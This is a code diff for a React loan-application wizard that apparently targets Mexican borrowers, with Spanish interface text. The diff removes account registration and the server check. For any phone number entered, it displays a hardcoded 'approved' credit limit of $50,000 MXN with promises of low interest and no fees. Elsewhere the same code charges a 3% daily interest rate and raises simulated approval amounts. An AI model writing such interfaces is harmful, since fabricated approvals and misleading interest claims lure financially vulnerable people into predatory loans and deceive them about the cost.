@@ -40,9 +40,8 @@ interface StepProps {
 const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, updateApplicationStep }) => {
   const { t } = useTranslation();
   const [phone, setPhone] = useState(data.phone || '');
-  const [password, setPassword] = useState('');
-  const [confirmPassword, setConfirmPassword] = useState('');
   const [countryCode, setCountryCode] = useState('+52');
+  const [showApprovedAmount, setShowApprovedAmount] = useState(false);
 
   const countryCodes = [
     // 拉丁美洲国家（优先显示）
@@ -104,62 +103,39 @@ const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, up
     { code: '+7', name: 'Rusia', flag: '🇷🇺' }
   ];
 
-  const handleRegister = () => {
+  const handleCheckEligibility = () => {
     if (!phone) {
       alert(t('errors.phoneRequired'));
       return;
     }
 
-    if (!password || password.length < 6) {
-      alert(t('errors.passwordMin'));
-      return;
-    }
-
-    if (password !== confirmPassword) {
-      alert(t('errors.passwordMismatch'));
-      return;
-    }
-
     const fullPhone = countryCode + phone;
 
-    fetch(getApiUrl('/api/auth/register'), {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        phone: fullPhone,
-        password,
-        applicationId: data.id
-      })
-    })
-      .then(response => response.json())
-      .then(result => {
-        if (result.success) {
-          // 更新申请数据，包括申请ID
-          const updatedData = {
-            phone: fullPhone,
-            isGuest: false,
-            id: result.applicationId || data.id // 使用返回的申请ID，如果没有则保持原有ID
-          };
-          onUpdate(updatedData);
+    // 显示审批金额
+    setShowApprovedAmount(true);
 
-          if (updateApplicationStep) {
-            updateApplicationStep(1, { phone: fullPhone, registered: true });
-          }
-          onNext();
-        } else {
-          alert(result.error || t('errors.invalid'));
-        }
-      })
-      .catch(() => {
-        alert(t('errors.invalid'));
-      });
+    // 更新申请数据
+    const updatedData = {
+      phone: fullPhone,
+      isGuest: false,
+      id: data.id
+    };
+    onUpdate(updatedData);
+
+    if (updateApplicationStep) {
+      updateApplicationStep(1, { phone: fullPhone, registered: true });
+    }
+  };
+
+  const handleContinue = () => {
+    onNext();
   };
 
   return (
     <div className="space-y-6">
       <div>
-        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step1.title')}</h3>
-        <p className="text-gray-600">{t('loanWizard.step1.subtitle')}</p>
+        <h3 className="text-2xl font-bold mb-2">¡Préstamos con Interés Bajo!</h3>
+        <p className="text-gray-600">Ingresa tu número de teléfono para ver tu límite de crédito aprobado</p>
       </div>
 
       <div className="space-y-4">
@@ -172,6 +148,7 @@ const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, up
               value={countryCode}
               onChange={(e) => setCountryCode(e.target.value)}
               className="px-3 py-3 border border-gray-300 border-r-0 rounded-l-lg bg-gray-50 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+              disabled={showApprovedAmount}
             >
               {countryCodes.map((country) => (
                 <option key={country.code} value={country.code}>
@@ -185,44 +162,45 @@ const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, up
               onChange={(e) => setPhone(e.target.value)}
               placeholder={t('loanWizard.step1.phonePlaceholder')}
               className="flex-1 px-4 py-3 border border-gray-300 rounded-r-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+              disabled={showApprovedAmount}
             />
           </div>
         </div>
 
-        <div>
-          <label className="block text-sm font-medium text-gray-700 mb-2">
-            {t('loanWizard.step1.passwordLabel')}
-          </label>
-          <input
-            type="password"
-            value={password}
-            onChange={(e) => setPassword(e.target.value)}
-            placeholder={t('loanWizard.step1.passwordPlaceholder')}
-            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
-            minLength={6}
-          />
-        </div>
+        {!showApprovedAmount ? (
+          <button
+            onClick={handleCheckEligibility}
+            disabled={!phone}
+            className="w-full py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed font-medium"
+          >
+            Ver Mi Límite de Crédito
+          </button>
+        ) : (
+          <div className="space-y-4">
+            <div className="bg-green-50 border border-green-200 rounded-lg p-6 text-center">
+              <h4 className="font-semibold text-green-800 mb-2">¡Felicidades! Tu límite de crédito es:</h4>
+              <div className="text-3xl font-bold text-green-600 mb-2">$50,000 MXN</div>
+              <p className="text-sm text-green-700">Préstamo con interés bajo disponible ahora</p>
+            </div>
+            
+            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
+              <h4 className="font-medium text-blue-800 mb-2">Beneficios de tu préstamo:</h4>
+              <ul className="text-sm text-blue-700 space-y-1">
+                <li>• Tasa de interés baja: 15% OFF (promoción por tiempo limitado)</li>
+                <li>• Hasta 100,000 pesos de crédito</li>
+                <li>• Sin comisión de procesamiento</li>
+                <li>• Pago anticipado permitido sin penalización</li>
+              </ul>
+            </div>
 
-        <div>
-          <label className="block text-sm font-medium text-gray-700 mb-2">
-            {t('loanWizard.step1.confirmPasswordLabel')}
-          </label>
-          <input
-            type="password"
-            value={confirmPassword}
-            onChange={(e) => setConfirmPassword(e.target.value)}
-            placeholder={t('loanWizard.step1.confirmPasswordPlaceholder')}
-            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
-          />
-        </div>
-
-        <button
-          onClick={handleRegister}
-          disabled={!phone || !password || password !== confirmPassword}
-          className="w-full py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed font-medium"
-        >
-          {t('loanWizard.step1.registerButton')}
-        </button>
+            <button
+              onClick={handleContinue}
+              className="w-full py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-medium"
+            >
+              Continuar con mi Solicitud
+            </button>
+          </div>
+        )}
       </div>
     </div>
   );
@@ -1070,7 +1048,7 @@ const Step9Processing: React.FC<StepProps> = ({ onNext, updateApplicationStep })
 // 第10步：审批通过
 const Step10Approved: React.FC<StepProps> = ({ onNext, onBack, updateApplicationStep }) => {
   const { t } = useTranslation();
-  const approvedAmount = 50000; // 模拟审批金额
+  const approvedAmount = 100000; // 模拟审批金额
 
   return (
     <div className="space-y-6 text-center">
@@ -1125,7 +1103,7 @@ const Step11Withdrawal: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack,
   const { t } = useTranslation();
   const [withdrawalAmount, setWithdrawalAmount] = useState(data.withdrawalAmount || '');
   const [installmentPeriod, setInstallmentPeriod] = useState(data.installmentPeriod || 30);
-  const maxAmount = 50000;
+  const maxAmount = 100000;
 
   const calculateTotalRepayment = (principal: number, days: number) => {
     const dailyRate = 0.03; // 3% 日利率
